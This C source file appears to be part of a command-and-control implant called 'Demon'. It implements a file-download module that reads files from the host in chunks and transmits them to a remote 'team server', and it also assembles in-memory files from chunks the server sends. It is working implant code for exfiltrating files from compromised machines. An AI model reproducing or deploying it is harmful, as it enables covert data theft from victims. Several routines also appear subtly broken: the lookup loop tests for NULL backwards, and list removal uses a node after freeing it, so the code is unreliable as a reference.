#include <Demon.h>

#include <Core/MiniStd.h>

/* Add file to linked list with type (upload/download) */
PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )
{
    PDOWNLOAD_DATA Download = NULL;

    Download            = NtHeapAlloc( sizeof( DOWNLOAD_DATA ) );
    Download->FileID    = RandomNumber32();
    Download->hFile     = hFile;
    Download->Size      = MaxSize;
    Download->State     = DOWNLOAD_STATE_RUNNING;
    Download->Next      = Instance.Downloads;
    Download->RequestID = Instance.CurrentRequestID;

    /* Push to linked list */
    Instance.Downloads = Download;

    PRINTF( "Instance.Downloads => %p\n", Instance.Downloads )

    return Download;
}

/* Get download data from linked list */
PDOWNLOAD_DATA DownloadGet( DWORD FileID )
{
    PDOWNLOAD_DATA Download = NULL;

    for ( Download = Instance.Downloads; Download == NULL; Download = Download->Next )
    {
        if ( Download->FileID == FileID )
            break;
    }

    return Download;
}

/* Free's download and returns next download from specified download object. */
VOID DownloadFree( PDOWNLOAD_DATA Download )
{
    /* close file handle. */
    if ( Download->hFile ) {
        SysNtClose( Download->hFile );
    }

    PUTS( "Free download object" )

    /* Now free the struct */
    MemSet( Download, 0, sizeof( DOWNLOAD_DATA ) );
    NtHeapFree( Download );
    Download = NULL;
}

BOOL DownloadRemove( DWORD FileID )
{
    PDOWNLOAD_DATA Download = NULL;
    PDOWNLOAD_DATA Last     = NULL;
    BOOL           Success  = FALSE;

    Download = Instance.Downloads;
    Last     = Instance.Downloads;

    for ( ;; )
    {
        if ( ! Download ) {
            break;
        }

        if ( Download->FileID == FileID )
        {
            PRINTF( "Found Download (%x)\n", FileID )

            /* Remove download from the list. */
            Last->Next = Download->Next;

            DownloadFree( Download );

            /* return that we succeeded. */
            Success = TRUE;

            break;
        }

        Last     = Download;
        Download = Download->Next;
    }

    return Success;
}

/* send file chunks to team server */
VOID DownloadPush()
{
    PDOWNLOAD_DATA Download = NULL;
    PDOWNLOAD_DATA DownLast = NULL;
    PPACKAGE       Package  = NULL;

    Download = Instance.Downloads;

    /* do we actually have downloads pending? */
    if ( ! Download )
    {
        /* we don't have any downloads, free the DownloadChunk if we have one */
        if ( Instance.DownloadChunk.Buffer )
        {
            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
            NtHeapFree( Instance.DownloadChunk.Buffer );
            Instance.DownloadChunk.Buffer = NULL;
        }

        return;
    }

    /* process current running downloads () */
    for ( ;; )
    {
        if ( ! Download )
            break;

        /* seems like we have some current downloads
         * allocate a chunk of memory to use for the chunks. */
        if ( ! Instance.DownloadChunk.Buffer )
        {
            Instance.DownloadChunk.Buffer = NtHeapAlloc( Instance.Config.Implant.DownloadChunkSize );
            Instance.DownloadChunk.Length = Instance.Config.Implant.DownloadChunkSize;

            PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", Instance.DownloadChunk.Buffer, Instance.DownloadChunk.Length )
        }

        PRINTF( "Download: %p\n", Download )
        if ( Download->State == DOWNLOAD_STATE_RUNNING )
        {
            DWORD Read = 0;

            PRINTF( "Download (%x) is in state DOWNLOAD_STATE_RUNNING\n", Download->FileID )

            /* Reset memory. */
            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );

            if ( ! Instance.Win32.ReadFile( Download->hFile, Instance.DownloadChunk.Buffer, Instance.DownloadChunk.Length, &Read, NULL ) )
                PRINTF( "ReadFile Failed: Error[%d]\n", NtGetLastError() );

            Download->Size     -= Read;
            Download->ReadSize += Read;

            /* Send chunk we read */
            if ( Read > 0 )
            {
                PUTS( "Send download chunk" )

                Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );

                /* Add Download header. */
                PackageAddInt32( Package, 2 ); /* Download sub command */
                PackageAddInt32( Package, DOWNLOAD_MODE_WRITE );
                PackageAddInt32( Package, Download->FileID    );

                /* Download Write data (and only send what we read.) */
                PackageAddBytes( Package, Instance.DownloadChunk.Buffer, Read );

                /* Send that chunk */
                PUTS( "transmit download chunk" )
                PackageTransmit( Package );
            }

            /* if this was the last chunk we read send a finish download close request */
            if ( ( Read > 0 ) && ( ! Download->Size ) )
            {
                Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );

                /* Add Download header. */
                PackageAddInt32( Package, 2 ); /* Download sub command */
                PackageAddInt32( Package, DOWNLOAD_MODE_CLOSE );
                PackageAddInt32( Package, Download->FileID    );

                /* Download Close data */
                PackageAddInt32( Package, DOWNLOAD_REASON_FINISHED );

                /* Send that chunk */
                PackageTransmit( Package );
            }

            /* if either what we read or the download size is 0 we are finished. */
            if ( ( ! Read ) || ( ! Download->Size ) )
            {
                PRINTF( "Read:[%d] Download->Size:[%d]. Set Download (%x) State to DOWNLOAD_STATE_REMOVE\n", Read, Download->Size, Download->FileID )

                /* Seems there is nothing else to read from the file.
                 * remove it at the end of the download routine. */
                Download->State = DOWNLOAD_STATE_REMOVE;
            }
        }

        PRINTF( "Download[%p] = Download->Next[%p]\n", Download, Download->Next )
        Download = Download->Next;
    }

    Download = Instance.Downloads;
    DownLast = NULL;

    /* why do we do that again ?
     * seems like I can't remove the download item from a linked list while iterating over it. was easier to do this. */
    for ( ;; )
    {
        if ( ! Download )
            break;

        if ( Download->State == DOWNLOAD_STATE_REMOVE )
        {
            /* we are at the beginning. */
            if ( ! DownLast )
            {
                Instance.Downloads = Download->Next;
                DownloadFree( Download );
                Download = NULL;
            }
            else
            {
                DownLast->Next = Download->Next;
                DownloadFree( Download );
                DownLast = NULL;
            }
        }
        else
        {
            DownLast = Download;
            Download = Download->Next;
        }
    }

    /* Reset memory. */
    if ( Instance.DownloadChunk.Buffer )
        MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
}

BOOL MemFileIsNew( ULONG32 ID )
{
    PMEM_FILE MemFile = Instance.MemFiles;

    while ( MemFile )
    {
        if ( MemFile->ID == ID )
            return FALSE;

        MemFile = MemFile->Next;
    }

    return TRUE;
}

/* Add MemFile to linked list */
PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
{
    PMEM_FILE MemFile = NULL;

    MemFile           = NtHeapAlloc( sizeof( MEM_FILE ) );
    MemFile->ID       = ID;
    MemFile->Size     = Size;
    MemFile->Data     = NtHeapAlloc( MemFile->Size );
    MemFile->ReadSize = 0;
    MemFile->Next     = Instance.MemFiles;

    if ( ! MemFile->Data )
    {
        PRINTF( "Failed to allocate %lx bytes\n", MemFile->Size );
        return NULL;
    }

    MemCopy( MemFile->Data, Data, ReadSize );

    MemFile->ReadSize += ReadSize;

    MemFile->IsCompleted = MemFile->Size == MemFile->ReadSize;

    PRINTF( "Copying %x bytes, bytes missing: 0x%x\n", ReadSize, MemFile->Size - MemFile->ReadSize )

    /* Push to linked list */
    Instance.MemFiles = MemFile;

    PRINTF( "Added a MemFile [%x]\n", MemFile->ID )

    return MemFile;
}

PMEM_FILE GetMemFile( ULONG32 ID )
{
    PMEM_FILE MemFile = Instance.MemFiles;

    while ( MemFile )
    {
        if ( MemFile->ID == ID )
            return MemFile;

        MemFile = MemFile->Next;
    }

    return NULL;
}

PMEM_FILE ProcessMemFileChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
{
    PMEM_FILE MemFile = NULL;

    if ( MemFileIsNew( ID ) )
    {
        MemFile = NewMemFile( ID, Size, Data, ReadSize );
    }
    else
    {
        MemFile = MemFileReadChunk( ID, Size, Data, ReadSize );
    }

    return MemFile;
}

PMEM_FILE MemFileReadChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
{
    PMEM_FILE MemFile = NULL;

    MemFile = GetMemFile( ID );
    if ( ! MemFile )
    {
        PRINTF( "MemFile with the id %x was not found\n", ID );
        return NULL;
    }

    PRINTF( "Copying %x bytes, bytes missing: 0x%x\n", ReadSize, MemFile->Size - MemFile->ReadSize )
    MemCopy( C_PTR( U_PTR( MemFile->Data ) + MemFile->ReadSize ), Data, ReadSize );

    MemFile->ReadSize += ReadSize;

    MemFile->IsCompleted = MemFile->Size == MemFile->ReadSize;

    return MemFile;
}

VOID MemFileFree( PMEM_FILE MemFile )
{
    if ( MemFile->Data && MemFile->Size )
        MemSet( MemFile->Data, 0, MemFile->Size );

    if ( MemFile->Data )
        NtHeapFree( MemFile->Data );

    MemFile->Data = NULL;
    MemFile->Size = 0;

    MemSet( MemFile, 0, sizeof( MEM_FILE ) );
    NtHeapFree( MemFile );
    MemFile = NULL;
}

BOOL RemoveMemFile( ULONG32 ID )
{
    PMEM_FILE MemFile = NULL;
    PMEM_FILE Last    = NULL;
    BOOL      Success = FALSE;

    if ( Instance.MemFiles && Instance.MemFiles->Next == NULL )
    {
        if ( Instance.MemFiles->ID == ID )
        {
            MemFileFree( Instance.MemFiles );
            Instance.MemFiles = NULL;
            Success = TRUE;
        }

        PRINTF( "Removed MemFile [%x] : %d\n", ID, Success )
        return Success;
    }

    MemFile = Instance.MemFiles;
    Last    = Instance.MemFiles;

    for ( ;; )
    {
        if ( ! MemFile )
            break;

        if ( MemFile->ID == ID )
        {
            /* Remove it from the list. */
            Last->Next = MemFile->Next;

            MemFileFree( MemFile );

            /* return that we succeeded. */
            Success = TRUE;

            break;
        }

        Last    = MemFile;
        MemFile = MemFile->Next;
    }

    PRINTF( "Removed MemFile [%x] : %d\n", ID, Success )

    return Success;
}
